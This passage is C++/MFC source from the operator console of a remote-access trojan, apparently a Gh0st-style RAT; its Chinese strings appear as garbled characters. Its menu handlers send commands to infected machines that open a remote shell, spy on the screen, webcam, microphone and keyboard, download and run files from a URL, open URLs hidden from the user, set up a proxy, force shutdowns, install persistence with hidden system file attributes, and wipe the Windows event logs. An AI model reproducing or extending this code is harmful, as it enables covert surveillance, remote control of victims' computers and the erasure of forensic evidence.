			CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
			
			/////////////////////////////////////////////////////////////////////////////////
			LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
			
			int nCnt = pView->m_pListCtrl->GetItemCount();
			str.Format("%d",pView->m_nCount++);
			int i = 0;
			
			//����
			if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
			{
				str=m_QQwry->IPtoAdd(IPAddress);
			}
			else
			{
				str =  "";
			}
			int countryno=FindCountry(str);
			i = pView->m_pListCtrl->InsertItem(nCnt, NULL, countryno);//ʹ��ָ��ͼ��
			
			////////////////////////////////////////////////////////////////////////////////

			for(int a =1;a<g_Column_Count;a++)
				pView->m_pListCtrl->SetItemText(i, a, m_pListCtrl->GetItemText(m, a));			
			
			CString strdiliweizi;
			if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
			{
				strdiliweizi = m_QQwry->IPtoAdd(IPAddress);
				
			}
			else
			{
				strdiliweizi.Format("%s", "û���ҵ�QQWry.dat�ļ� !");
			}
			
			// ����λ��
			pView->m_pListCtrl->SetItemText(i, 0, strdiliweizi);
			
			// ָ��Ψһ��ʶ
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			
			g_pTabView->UpDateNumber();
			//g_pFrame->ShowConnectionsNumber();
		}
	}
}

void CPcView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	SetSortImage(m_nSortedCol, m_bAscending);
	CXTPSortClass csc(m_pListCtrl, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}

#define ID_FIRST1 0
BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	
	if ((((LPNMHDR)lParam)->code == NM_RCLICK))  
    {
		CMenu menu;
		menu.CreatePopupMenu();
		
		LVCOLUMN lvcol;
		char str[256];
		int nColNum = 0;
		CString strColumnName[20];//������255��
		
		lvcol.mask = LVCF_TEXT;
		lvcol.pszText = str;
		lvcol.cchTextMax = 256;
		while(m_pListCtrl->GetColumn(nColNum, &lvcol))
		{ 
			strColumnName[nColNum] = lvcol.pszText;
			menu.AppendMenu(MF_STRING,ID_FIRST1 + nColNum,strColumnName[nColNum]);
			
			menu.CheckMenuItem(ID_FIRST1 + nColNum, (m_pListCtrl->GetColumnWidth(nColNum) == 0) ? MF_UNCHECKED : MF_CHECKED);
			
			nColNum++;
		}
		
		CPoint	p;
		GetCursorPos(&p);
		CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN|TPM_RIGHTBUTTON,p.x,p.y,this);
//		menu.TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
		menu.DestroyMenu();

    }  
	
	return CXTPListView::OnNotify(wParam, lParam, pResult);
}

//=======================================================================================

void CPcView::OnMenuitemFilemanager() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpFilePacket , nFilePacketLength );
}

void CPcView::OnMenuitemRemoteshell() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpShellPacket , nShellPacketLength  );
}

void CPcView::OnMenuitemScreenspy() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpScreenPacket , nScreenPacketLength );
}

void CPcView::OnMenuitemWebcam() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpWebCamPacket , nWebCamPacketLength );
}

void CPcView::OnMenuitemAudioListen() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpAudioPacket , nAudioPacketLength );
}

void CPcView::OnMenuitemSystem() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpSystemPacket , nSystemPacketLength );
}

void CPcView::OnMenuitemKeyboard() 
{
	// TODO: Add your command handler code here
	//	SendSelectCommand(lpKeyboardPacket , nKeyboardPacketLength );
	if (MessageBox(_T("ȷ���򿪼��̼�¼�𣿰�ȫ������ܻ����أ�����"), _T("��ʾ"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}
void CPcView::OnChat() //���а�
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CHAT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnMenuitemServicemanager() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpServicePacket , nServicePacketLength );
}
 
void CPcView::OnMenuitemRegedit() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpRegeditPacket , nRegeditPacketLength );
}

void CPcView::OnMenuitemTextChat() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpTextChatPacket , nTextChatPacketLength );
}

void CPcView::OnMenuitemProxyMap() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpProxyMapPacket , nProxyPacketLength );
}

//=======================================================================================

 
void CPcView::OnMenuitemReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnMenuitemShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnMenuitemLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}
void CPcView::OnSetcolor() 
{
	// TODO: Add your command handler code here
	CSetColor m_dlgColor;
	BOOL bItem=FALSE;
	
	COLORREF m_Color;
	TCHAR szColor[16];
	ZeroMemory(szColor,16);
	if ( m_dlgColor.DoModal() == IDOK )
	{
		
		switch(m_dlgColor.nSecletIndex)
		{
		case 0:
			lstrcpy(szColor,_T("Blank"));
			m_Color = RGB(0, 0, 0);
			break;
		case 1:
			lstrcpy(szColor,_T("Green"));
			m_Color = RGB(0,255,0);
			break;
		case 2:
			lstrcpy(szColor,_T("Purple"));
			m_Color = RGB(85, 26,139);
			break;
		case 3:
			lstrcpy(szColor,_T("Red"));
			m_Color = RGB(255, 0, 0);
			break;
		default:
			break;
		}
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
		if (pos==NULL)
			return;
		while(pos)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			m_pListCtrl->SetItemText( nItem, 13, szColor);
		}
			
		
		LPBYTE	lpPacket = new BYTE[strlen(szColor) + 1];
		ZeroMemory(lpPacket,strlen(szColor) + 1);			
		lpPacket[0] = COMMAND_CLORE;
		memcpy(lpPacket + 1, szColor, strlen(szColor));	
		SendSelectCommand(lpPacket, strlen(szColor) + 1);
		delete[] lpPacket;
		
	}
}

void CPcView::OnMenuitemSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,TRUE);
	}
}

void CPcView::OnMenuitemUninstall() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("ȷ��ж�ط������ -:)"), _T("Warning"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_UNINSTALL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
	pInfoMation->ShowSysinfoListDel();//�������������Ϣ��ߵ���ֵ

}

void CPcView::OnMenuitemRemark() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
		return ;	
	
	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format(_T("��������(%s)�ı�ע"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle.Format("��ѡ��(%d)̨���� ��������������ע",m_pListCtrl->GetSelectedCount());
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("�������µı�ע:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("��ѡ��(%d)̨���� Զ�̷�����ַ",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("������Ҫ��ʾ���ʵ���ַ:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemOpenUrlHide() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("��ѡ��(%d)̨���� Զ�̷�����ַ",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("������Ҫ��ʾ���ʵ���ַ:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,FALSE);
	}
}

void CPcView::OnMenuitemDownexec() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("��ѡ��(%d)̨���� ������",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("������Ҫ�����ļ��ĵ�ַ:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemLocalUpload() 
{
	// TODO: Add your command handler code here
	CLocalUpload dlg;
	dlg.DoModal();
}

void CPcView::OnLButtonDown(UINT nFlags, CPoint point)
{
	
	CXTPListView::OnLButtonDown(nFlags, point);
	
	if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Hostlist", false) == 1)
	{
		BYTE	bToken = COMMAND_BUUTO_SYSINFO;
		SendSelectCommand(&bToken, sizeof(BYTE));
	}
	
}




void CPcView::OnMenuitemFindProcess() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString str;
	str.Format("��ѡ��(%d)̨���� ���ҽ���(�ҵ����ڻ�����ǰ��ʾ*��)",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("������Ҫ���ҵĽ�����(����qq.exe):"), this);
	if (dlg.DoModal() == IDOK)
	{
		int		nPacketLength = dlg.m_str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_FIND_PROCESS;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}

void CPcView::OnMenuitemFindWindow() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString str;
	str.Format("��ѡ��(%d)̨���� ���Ҵ���(�ҵ����ڻ�����ǰ��ʾ*��)",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("������Ҫ���ҵĴ��ڱ������������:"), this);
	if (dlg.DoModal() == IDOK)
	{
		int		nPacketLength = dlg.m_str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_FIND_WINDOW;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}

void CPcView::OnMenuitemCleanFind() 
{
	// TODO: Add your command handler code here
	int nCount = m_pListCtrl->GetItemCount();
	
	for (int i=0; i < nCount; i++)
	{
		CString str;
		str = 	m_pListCtrl->GetItemText(i, 3);
		int n = str.Find('*');
		if (n == 0)
			str = str.Right(str.GetLength() - 1);
		else
			continue;
		m_pListCtrl->SetItemText(i, 3, str);
	}
}

void CPcView::OnMenuitemCopyIp() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 1);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	CSystemDlg::SetClipboardText(Data);
	MessageBox("����IP�Ѹ��Ƶ����а�");
}

void CPcView::OnMenuitemCopyAll() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		Name = "";
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		for(int i = 0; i < m_pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
		{
			Name += m_pListCtrl->GetItemText(nItem, i);
			Name += "	";
		}
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	CSystemDlg::SetClipboardText(Data);	
	MessageBox("������Ϣ�Ѹ��Ƶ����а�");
}

void CPcView::OnMenuitemUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("��ѡ��(%d)̨���� ���ظ��·����",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("������Ҫ�����·���˵ĵ�ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("�������ַ���Ϸ�"), _T("����"));
		return;
	}
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_UPDATE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemChangeDllinfo() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() > 1)
	{
		AfxMessageBox("�鿴�����뵥ѡ");
		return;	
	}
	BYTE bToken = COMMAND_CHANGEDLLINFO;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}



BOOL CPcView::OnCommand(WPARAM wParam, LPARAM lParam) 
{
	// TODO: Add your specialized code here and/or call the base class
	int menuID = LOWORD(wParam) - ID_FIRST1;

	CString str;
	str.Format("Width%d",menuID);

	if(m_pListCtrl->GetColumnWidth(menuID) == 0)
		m_pListCtrl->SetColumnWidth(menuID,g_Column_Data[menuID].nWidth);
	else
		m_pListCtrl->SetColumnWidth(menuID,0);

	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("MainHeader_Column_Width", str, m_pListCtrl->GetColumnWidth(menuID));

	return CXTPListView::OnCommand(wParam, lParam);
}


#include "MsgBoxDlg.h"
void CPcView::OnMenuitemMessagebox() 
{
	// TODO: Add your command handler code here
	struct MSGBOX
	{
		CHAR Title[200];
		CHAR szText[1000];
		UINT Type;
}MsgBox;

	CMsgBoxDlg dlg;
SHOW:
	if(dlg.DoModal() != IDOK) 
		return;

	if (strlen(dlg.m_edit_caption)<1 || strlen(dlg.m_edit_text) < 1)
	{
		MessageBox("�����뷢�ͱ��⼰����!!... ", "��ʾ! ", MB_OK | MB_ICONWARNING);
		goto SHOW;
	}

	ZeroMemory(&MsgBox,sizeof(MSGBOX));
	strcpy(MsgBox.Title,dlg.m_edit_caption.GetBuffer(0));
	strcpy(MsgBox.szText,dlg.m_edit_text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton|dlg.m_msgIcon;
	
	BYTE	*bToken = new BYTE[sizeof(MSGBOX)+1];
	bToken[0]= COMMAND_MESSAGEBOX;
	memcpy(&bToken[1],&MsgBox,sizeof(MSGBOX));
	
	SendSelectCommand(bToken, sizeof(MSGBOX)+1);
	delete bToken;
	goto SHOW;
}

void CPcView::OnMenuitemSaveIplist() 
{
	// TODO: Add your command handler code here
	CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("�ı��ļ�|*.txt"), NULL);
    if (dlg.DoModal() != IDOK)
		return;
	
	CFile file;
	if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	{
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		while (pos)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			CString strTitle;
			strTitle.Format(_T("%s\r\n"), m_pListCtrl->GetItemText(nItem, 1));
			file.Write(strTitle, strlen(strTitle));
		}
		file.Close();
		AfxMessageBox(_T("IP�б����ɹ�!"));
	}
}

#include "..\DLL\Plugins\C_PROXY.h"
void CPcView::OnMenuitemProxy() 
{
	// TODO: Add your command handler code here
	COpenProxy dlg;	

	int nRet = dlg.DoModal();
	if(nRet == IDOK) 
	{
		char szToken[99];
		memset(szToken,0,sizeof(szToken));
		// �����Ҫ��֤
		if (dlg.m_check_verify)
		{
			if (dlg.m_edit_user.IsEmpty() || dlg.m_edit_pass.IsEmpty())
			{
				AfxMessageBox("��Ϣ��������");
				return;
			}
			wsprintf(szToken,"%d|%s|%s",dlg.m_edit_port,dlg.m_edit_user,dlg.m_edit_pass);
		}
		else
			wsprintf(szToken,"%d",dlg.m_edit_port);
		
		
		int nPacketLength = 100 + PROXYMyFileSize;
		LPBYTE lpPacket = new BYTE[nPacketLength];
		if(lpPacket == NULL)			return;
		lpPacket[0] = COMMAND_OPEN_PROXY;
		memcpy(lpPacket + 1, szToken, 99);
		memcpy(lpPacket + 100,PROXYMyFileBuf,PROXYMyFileSize);
		
    	SendSelectCommand(lpPacket, nPacketLength);
		delete [] lpPacket; 
	}
	else if (nRet == IDNO)
	{
		BYTE bToken = COMMAND_CLOSE_PROXY;
		SendSelectCommand(&bToken,sizeof(bToken));
	}
} 
  
void CPcView::OnMenuitemPrank() 
{
	// TODO: Add your command handler code here
	CPrankDlg dlg;
	dlg.DoModal();
}

void CPcView::OnMenuitemCleaneventAll() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_ALL;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnMenuitemCleaneventSys() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_SYS;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnMenuitemCleaneventSecurity() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_SEC;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnMenuitemCleaneventApp() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_APP;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}


void CPcView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CXTPListView::OnRButtonDown(nFlags, point);
	CPoint p;
	GetCursorPos(&p);
	
	CMenu menu;
	VERIFY(menu.LoadMenu(IDR_MENU_LIST));
	
	CMenu* pPopup = menu.GetSubMenu(0);
	ASSERT(pPopup != NULL);
	CWnd* pWndPopupOwner = this;
	
	while (pWndPopupOwner->GetStyle() & WS_CHILD)
		pWndPopupOwner = pWndPopupOwner->GetParent();
	
	CXTPCommandBars::TrackPopupMenu(pPopup, TPM_RIGHTBUTTON,  p.x, p.y, AfxGetMainWnd(), 0, pWndPopupOwner);
}

struct START
{
	CHAR Startname[200];
	WORD FileAttribute;      //�ļ�����	
	WORD Enlarge;            //��װ����
}Start;
void CPcView::OnStart() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		MessageBox("��ѡ��������");
		return ;	
	}
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if (pos==NULL)
		return;
	
	if (MessageBox(_T("ȷ��д�������𣿰�ȫ������ܻ����أ�����"), _T("��ʾ"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	
	CStart dlg;
one:
	if(dlg.DoModal() != IDOK) 
		return;
	
	if ((strlen(dlg.m_StartName) < 1))
	{
		MessageBox("�������ļ�����!!... ", "��ʾ! ", MB_OK | MB_ICONWARNING);
		goto one;
	}
	
	CString rString = dlg.m_strCur;
	
	ZeroMemory(&Start,sizeof(START));
	strcpy(Start.Startname,dlg.m_StartName.GetBuffer(0));
	
	
	
	if(rString == "����")
		Start.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if(rString == "����")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN;
	
	if(rString == "ϵͳ")
		Start.FileAttribute = FILE_ATTRIBUTE_SYSTEM;
	
	if(rString == "ֻ��")
		Start.FileAttribute = FILE_ATTRIBUTE_READONLY;
	
	if(rString == "����+ϵͳ")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	
	if(rString == "����+ϵͳ+ֻ��")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;
	
	Start.Enlarge=(WORD)dlg.m_Enlarge;
	
	
	BYTE	*bToken = new BYTE[sizeof(START)+1];
	bToken[0]= COMMAND_START;
	memcpy(&bToken[1],&Start,sizeof(START));
	
	SendSelectCommand(bToken, sizeof(START)+1);
	delete bToken;
	goto one;
	
}
void CPcView::OnScreen()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_Screensp;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}
